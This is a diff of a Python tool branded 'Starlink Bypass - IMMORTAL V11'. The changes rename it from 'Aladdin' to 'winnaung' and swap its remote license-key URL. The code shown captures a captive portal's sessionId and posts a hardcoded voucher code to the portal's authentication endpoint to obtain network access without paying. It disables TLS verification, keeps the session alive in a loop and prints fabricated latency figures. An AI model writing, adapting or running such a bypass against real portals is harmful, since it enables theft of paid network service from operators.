@@ -15,8 +15,8 @@ else:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
-KEY_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/refs/heads/main/key.txt"
-LICENSE_FILE = ".aladdin_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
+KEY_URL = "https://raw.githubusercontent.com/winnaung000001-bit/winnaung/refs/heads/main/key.txt"
+LICENSE_FILE = ".winnaung_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
 def get_hwid():
     ID_STORAGE = ".device_id" # ID သိမ်းမည့်ဖိုင်
     
@@ -56,14 +56,14 @@ def banner():
     os.system('clear')
     print("\033[93m" + " ="*35)
     print("\033[96m" + """
-      █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗
-     ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║
-     ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║
-     ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║
-     ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║
-     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
+██╗    ██╗██╗███╗   ██╗███╗   ██╗ █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
+██║    ██║██║████╗  ██║████╗  ██║██╔══██╗██║   ██║████╗  ██║██╔════╝ 
+██║ █╗ ██║██║██╔██╗ ██║██╔██╗ ██║███████║██║   ██║██╔██╗ ██║██║  ███╗
+██║███╗██║██║██║╚██╗██║██║╚██╗██║██╔══██║██║   ██║██║╚██╗██║██║   ██║
+╚███╔███╔╝██║██║ ╚████║██║ ╚████║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
+ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
     """)
-    print("\033[95m" + "        ✨ Aladdin Starlink Bypass - IMMORTAL V11 ✨")
+    print("\033[95m" + "        ✨ winnaung Starlink Bypass - IMMORTAL V11 ✨")
     print("\033[93m" + " ="*35 + "\033[0m\n")
 
 def save_license(hwid, key, expiry):
@@ -147,7 +147,7 @@ def high_speed_pulse(link):
     while True:
         try:
             requests.get(link, timeout=5, verify=False, headers=headers)
-            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
+            print(f"\033[92m[✓] winnaung Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
             time.sleep(0.01)
         except:
             time.sleep(1)
@@ -160,7 +160,7 @@ def start_immortal():
     while True:
         session = requests.Session()
         try:
-            print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
+            print("\033[94m[*] winnaung Force Scanning Portal...\033[0m")
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
             
             p_url = r.url
@@ -172,7 +172,7 @@ def start_immortal():
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
+                print(f"\033[96m[✓] winnaung SID Captured: {sid[:15]}\033[0m")
                 p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                 session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                 
